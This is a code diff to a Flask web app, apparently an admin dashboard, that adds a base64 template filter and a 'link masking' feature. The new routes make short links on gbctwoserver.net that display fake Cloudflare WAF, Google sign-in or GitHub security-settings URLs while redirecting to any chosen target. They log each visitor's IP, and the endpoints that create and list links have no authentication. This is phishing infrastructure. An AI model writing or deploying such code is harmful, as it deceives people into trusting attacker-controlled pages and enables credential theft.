@@ -95,6 +95,16 @@ def datetimeformat(value, format='%Y-%m-%d %H:%M'):
 
 app.jinja_env.filters['datetimeformat'] = datetimeformat
 
+# Base64 filter for templates
+def b64encode_filter(value):
+    """Base64 encode a string for use in templates."""
+    import base64
+    if isinstance(value, str):
+        value = value.encode('utf-8')
+    return base64.b64encode(value).decode('utf-8')
+
+app.jinja_env.filters['b64encode'] = b64encode_filter
+
 @app.after_request
 def _security_headers(resp):
     resp.headers["X-Frame-Options"] = "DENY"
@@ -5172,3 +5182,112 @@ def kaggle_auto_start_kernels():
     threading.Thread(target=do_start, daemon=True).start()
     
     return jsonify({"status": "started", "message": "Auto-start initiated in background"})
+
+# ──────────────────────── LINK MASKING SYSTEM ────────────────────────
+
+@app.route("/go/<code>")
+def masked_redirect(code):
+    """Handle masked link redirects with tracking."""
+    import json
+    from pathlib import Path
+    
+    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
+    
+    if not links_file.exists():
+        return render_template("error.html", error="Link not found"), 404
+    
+    try:
+        links = json.loads(links_file.read_text())
+    except:
+        return render_template("error.html", error="Invalid link database"), 500
+    
+    if code not in links:
+        return render_template("error.html", error="Link not found"), 404
+    
+    link = links[code]
+    
+    # Track click
+    link["clicks"] = link.get("clicks", 0) + 1
+    link["last_click"] = datetime.now().isoformat()
+    links_file.write_text(json.dumps(links, indent=2))
+    
+    # Log the click
+    log_event("masked_link_click", f"{code} -> {link['target_url']} from {request.remote_addr}")
+    
+    # Render redirect page with masking
+    return render_template("redirect.html",
+        target_url=link["target_url"],
+        display_url=link.get("display_url", ""),
+        display_text=link.get("display_text", ""),
+        code=code)
+
+@app.route("/api/links")
+def api_list_links():
+    """API endpoint to list all masked links."""
+    import json
+    from pathlib import Path
+    
+    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
+    
+    if not links_file.exists():
+        return jsonify({})
+    
+    try:
+        links = json.loads(links_file.read_text())
+        return jsonify(links)
+    except:
+        return jsonify({})
+
+@app.route("/api/links/create", methods=["POST"])
+def api_create_link():
+    """API endpoint to create masked link."""
+    import json
+    import random
+    import string
+    from pathlib import Path
+    
+    data = request.get_json() or {}
+    target_url = data.get("target_url")
+    mask_type = data.get("mask_type", "cloudflare")
+    custom_text = data.get("display_text")
+    
+    if not target_url:
+        return jsonify({"error": "target_url required"}), 400
+    
+    # Mask patterns
+    masks = {
+        "cloudflare": {"domain": "dash.cloudflare.com", "path": "/security/waf", "text": "Cloudflare Dashboard"},
+        "google": {"domain": "accounts.google.com", "path": "/signin", "text": "Google Account"},
+        "github": {"domain": "github.com", "path": "/settings/security", "text": "GitHub Settings"},
+    }
+    
+    mask = masks.get(mask_type, masks["cloudflare"])
+    
+    # Generate code
+    code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+    
+    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
+    links_file.parent.mkdir(parents=True, exist_ok=True)
+    
+    try:
+        links = json.loads(links_file.read_text()) if links_file.exists() else {}
+    except:
+        links = {}
+    
+    links[code] = {
+        "target_url": target_url,
+        "display_url": f"https://{mask['domain']}{mask['path']}",
+        "display_text": custom_text or mask["text"],
+        "mask_type": mask_type,
+        "created_at": datetime.now().isoformat(),
+        "clicks": 0,
+    }
+    
+    links_file.write_text(json.dumps(links, indent=2))
+    
+    return jsonify({
+        "code": code,
+        "short_url": f"https://gbctwoserver.net/go/{code}",
+        "display_url": links[code]["display_url"],
+        "target_url": target_url,
+    })
